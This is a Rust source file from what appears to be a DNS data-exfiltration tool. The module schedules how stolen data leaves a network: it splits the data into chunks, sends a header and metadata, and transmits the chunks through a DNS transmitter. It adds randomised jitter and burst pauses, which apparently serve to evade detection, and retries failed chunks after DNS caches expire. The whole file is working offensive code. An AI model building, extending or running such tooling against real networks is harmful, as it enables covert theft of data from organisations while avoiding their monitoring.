use crate::config::Config;
use crate::dns::{build_metadata_payload, DnsTransmitter};
use crate::metadata::ExfilSession;
use anyhow::Result;
use rand::Rng;
use std::collections::HashSet;
use std::thread;
use std::time::Duration;

const MAX_FINAL_RETRY_PASSES: usize = 3;

pub struct ChunkScheduler {
    cfg: Config,
}

impl ChunkScheduler {
    pub fn new(cfg: Config) -> Self {
        Self { cfg }
    }

    pub fn run(&self, session: &mut ExfilSession, transmitter: &mut DnsTransmitter) -> Result<()> {
        let metadata_payload = build_metadata_payload(session);
        let metadata_segments = split_metadata_segments(&metadata_payload, session.job.chunk_size);
        session.set_metadata_frames(metadata_segments.len());

        transmitter.send_header(session)?;
        transmitter.send_metadata_segments(session, &metadata_segments)?;

        // Track failed chunks for retry at the end
        let mut failed_chunks: HashSet<usize> = HashSet::new();
        let mut chunks_in_burst = 0usize;
        
        while session.next_chunk < session.job.total_chunks {
            let index = session.next_chunk;
            let (start, end) = session.chunk_range(index);
            let chunk = &session.job.data[start..end];

            // Try to send, but don't fail immediately - queue for retry
            if let Err(_) = self.send_chunk_with_retry(transmitter, session, index, chunk) {
                failed_chunks.insert(index);
                eprintln!("[!] Chunk {} failed, will retry later ({} pending)", index, failed_chunks.len());
            }
            session.next_chunk += 1;
            chunks_in_burst += 1;

            if session.next_chunk >= session.job.total_chunks {
                break;
            }

            if chunks_in_burst >= self.cfg.chunks_per_burst {
                chunks_in_burst = 0;
                self.sleep_with_jitter(self.cfg.burst_pause_ms);
            } else {
                self.sleep_with_jitter(0);
            }
        }

        // Final retry pass for any failed chunks
        if !failed_chunks.is_empty() {
            eprintln!("[*] Retrying {} failed chunks...", failed_chunks.len());
            self.retry_failed_chunks(session, transmitter, &mut failed_chunks)?;
        }

        transmitter.send_completion(session)?;
        Ok(())
    }

    fn retry_failed_chunks(
        &self,
        session: &ExfilSession,
        transmitter: &mut DnsTransmitter,
        failed_chunks: &mut HashSet<usize>,
    ) -> Result<()> {
        for pass in 0..MAX_FINAL_RETRY_PASSES {
            if failed_chunks.is_empty() {
                break;
            }

            // Wait longer between retry passes to let DNS caches expire
            let wait_secs = 5 * (pass + 1) as u64;
            eprintln!("[*] Retry pass {} ({} chunks), waiting {}s...", pass + 1, failed_chunks.len(), wait_secs);
            thread::sleep(Duration::from_secs(wait_secs));

            let chunks_to_retry: Vec<usize> = failed_chunks.iter().copied().collect();
            for index in chunks_to_retry {
                let (start, end) = session.chunk_range(index);
                let chunk = &session.job.data[start..end];

                // Use extended retry for final passes
                if self.send_chunk_extended_retry(transmitter, session, index, chunk).is_ok() {
                    failed_chunks.remove(&index);
                    eprintln!("[+] Chunk {} recovered", index);
                }

                // Small delay between retried chunks
                self.sleep_with_jitter(self.cfg.jitter_min_ms);
            }
        }

        if !failed_chunks.is_empty() {
            let mut sorted: Vec<_> = failed_chunks.iter().collect();
            sorted.sort();
            return Err(anyhow::anyhow!(
                "Failed to send {} chunks after all retries: {:?}",
                failed_chunks.len(),
                sorted
            ));
        }

        Ok(())
    }

    fn sleep_with_jitter(&self, base_ms: u64) {
        let mut rng = rand::thread_rng();
        let jitter = if self.cfg.jitter_max_ms > self.cfg.jitter_min_ms {
            rng.gen_range(self.cfg.jitter_min_ms..=self.cfg.jitter_max_ms)
        } else {
            self.cfg.jitter_min_ms
        };
        let total = base_ms + jitter;
        if total > 0 {
            thread::sleep(Duration::from_millis(total));
        }
    }

    fn send_chunk_with_retry(
        &self,
        transmitter: &mut DnsTransmitter,
        session: &ExfilSession,
        index: usize,
        chunk: &[u8],
    ) -> Result<()> {
        let mut attempts_remaining = self.cfg.chunk_retry_attempts.max(1);
        loop {
            match transmitter.send_chunk(session, index, chunk) {
                Ok(_) => return Ok(()),
                Err(err) => {
                    attempts_remaining -= 1;
                    if attempts_remaining == 0 {
                        return Err(err);
                    }
                    self.delay_before_retry();
                }
            }
        }
    }

    fn send_chunk_extended_retry(
        &self,
        transmitter: &mut DnsTransmitter,
        session: &ExfilSession,
        index: usize,
        chunk: &[u8],
    ) -> Result<()> {
        // Extended retry with longer delays for final retry passes
        let attempts = self.cfg.chunk_retry_attempts.max(1) * 2;
        for attempt in 0..attempts {
            match transmitter.send_chunk(session, index, chunk) {
                Ok(_) => return Ok(()),
                Err(_) => {
                    if attempt + 1 < attempts {
                        // Longer delay with exponential backoff
                        let delay_ms = self.cfg.chunk_retry_delay_ms.max(1000) * (1 << attempt.min(2));
                        thread::sleep(Duration::from_millis(delay_ms));
                    }
                }
            }
        }
        Err(anyhow::anyhow!("chunk {} failed after extended retry", index))
    }

    fn delay_before_retry(&self) {
        if self.cfg.chunk_retry_delay_ms > 0 {
            thread::sleep(Duration::from_millis(self.cfg.chunk_retry_delay_ms));
        } else {
            self.sleep_with_jitter(0);
        }
    }
}

fn split_metadata_segments(payload: &[u8], chunk_size: usize) -> Vec<Vec<u8>> {
    let segment_size = chunk_size.max(1);
    if payload.is_empty() {
        return vec![Vec::new()];
    }

    payload
        .chunks(segment_size)
        .map(|chunk| chunk.to_vec())
        .collect()
}
